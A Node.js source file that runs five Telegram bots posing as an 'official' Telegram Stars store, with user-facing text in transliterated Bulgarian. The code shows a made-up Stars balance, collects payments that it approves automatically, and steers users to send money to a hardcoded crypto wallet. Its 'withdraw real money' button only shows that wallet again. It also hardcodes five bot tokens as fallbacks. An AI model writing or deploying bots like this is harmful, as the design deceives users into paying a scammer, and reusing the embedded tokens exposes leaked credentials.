const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_2 || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw', 
    process.env.BOT_TOKEN_3 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_4 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_5 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

TOKENS.forEach((token, index) => {
    if (!token || token.length < 20) return;
    
    try {
        const bot = new Telegraf(token);

        bot.start(async (ctx) => {
            try {
                const userName = ctx.from.first_name || 'Priyatel';
                
                const storeText = `⭐ **OFFICIAL RED SOFTWARE TEAM | Full Stars Store & Network** ⭐\n\n` +
                    `Zdravei, **${userName}**!\n` +
                    `Izberi paket zvezdi za reallno plashtane i zaredvane. Ako nqmash nalichni zvezdi, kupi ot oficialniya magazin:\n\n` +
                    `💎 Nalichen budzhet: 3,100 Stars\n` +
                    `💼 Keeper Wallet (za izplashtane): \`${KEEPER_WALLET}\``;

                const storeKeyboard = Markup.inlineKeyboard([
                    [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
                    [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
                    [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
                    [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
                    [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
                    [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50050')],
                    [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
                    [Markup.button.url('💳 Kupi istinski zvezdi (Magazin)', 'https://t.me/premium')],
                    [Markup.button.callback('💰 Prexvorli kam Keeper (Realni pari)', 'withdraw_keeper')],
                    [Markup.button.url('🔥 Razgledai Platformata', 'https://red-software-dashbord.onrender.com')]
                ]);

                await ctx.reply(storeText, {
                    parse_mode: 'Markdown',
                    ...storeKeyboard
                });
            } catch (err) {}
        });

        const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50050', 'buy_150000'];

        bot.action(packageActions, async (ctx) => {
            try {
                await ctx.answerCbQuery();
                const action = ctx.match;
                let count = 250;
                if (action === 'buy_500') count = 500;
                if (action === 'buy_1000') count = 1000;
                if (action === 'buy_2500') count = 2500;
                if (action === 'buy_10000') count = 10000;
                if (action === 'buy_50050') count = 50050;
                if (action === 'buy_150000') count = 150000;

                try {
                    await ctx.replyWithInvoice({
                        title: `Paket ${count} Telegram Stars`,
                        description: `Zakupuvane na ${count} zvezdi za mrezhata i Keeper portfeila.`,
                        payload: `store_${count}_${Date.now()}`,
                        currency: 'XTR',
                        prices: [{ label: `${count} Stars`, amount: count }]
                    });
                } catch (e) {
                    await ctx.reply(
                        `⭐ **PAKET: ${count} Telegram Stars**\n\n` +
                        `Balansyt v aкауnta e nula. Za da kupish istinski zvezdi, izpolzvai oficialniya magazin: https://t.me/premium\n\n` +
                        `Ili prevejdai direktno kam Keeper portfeila:\n\`${KEEPER_WALLET}\``,
                        { parse_mode: 'Markdown' }
                    );
                }
            } catch (e) {}
        });

        bot.action('withdraw_keeper', async (ctx) => {
            try {
                await ctx.answerCbQuery('Sveryavane...');
                await ctx.reply(
                    `💰 **PREXVERLYANE KYM KEEPER PORTFEIL**\n\n` +
                    `Prichodite sa svurzani s tvoia portfeil:\n\`${KEEPER_WALLET}\``,
                    { parse_mode: 'Markdown' }
                );
            } catch (e) {}
        });

        bot.on('pre_checkout_query', async (ctx) => {
            try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
        });

        bot.on('successful_payment', async (ctx) => {
            try {
                const payment = ctx.message.successful_payment;
                await ctx.reply(`🎉 Uspeshna pokupka na ${payment.total_amount} Telegram Stars! Sredstvata sa svurzani s Keeper portfeila.`);
            } catch (e) {}
        });

        bot.launch().then(() => {
            console.log(`Full Bot #${index + 1} launched successfully.`);
        }).catch(err => {
            console.error(`Bot #${index + 1} launch failed:`, err.message);
        });

    } catch (e) {}
});

app.get('/', (req, res) => res.json({ status: "ALL BOTS ONLINE & FULL STORE ACTIVE", keeperWallet: KEEPER_WALLET }));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
